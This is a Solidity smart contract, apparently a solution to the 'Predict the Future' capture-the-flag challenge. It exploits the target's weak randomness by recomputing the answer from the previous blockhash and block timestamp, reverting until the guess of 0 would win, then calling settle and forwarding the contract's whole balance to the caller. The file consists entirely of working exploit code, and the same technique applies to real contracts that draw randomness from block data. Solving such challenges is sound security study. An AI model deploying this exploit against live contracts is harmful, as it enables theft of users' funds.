// SPDX-License-Identifier: MIT
pragma solidity >=0.7.5 <0.8.0;

interface PTF {
    function lockInGuess(uint8 n) external payable;
    function settle() external;
    function isComplete() external view returns (bool);
}

contract PredictTheFutureAttack {
    PTF public challenge;

    constructor(address payable _challenge) {
        // set challenge address
        challenge = PTF(_challenge);
    }

    function makeGuess() public payable {
        challenge.lockInGuess{value: 1 ether}(0);
    }

    function callSettle() public {
        // prevent the tx from continuing if the answer is not going to pass as correct
        uint8 answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)))) % 10;
        require(answer == 0, "tx will fail and guesser will be overwritten");

        // make the guess and check if the challenge is complete, otherwise revert
        challenge.settle();
        require(challenge.isComplete(), "challenge not complete yet");
        

        // send funds to my address
        (bool success,) = msg.sender.call{value:address(this).balance}("");
        require(success, "call failed");
    }

    receive() external payable {}
}
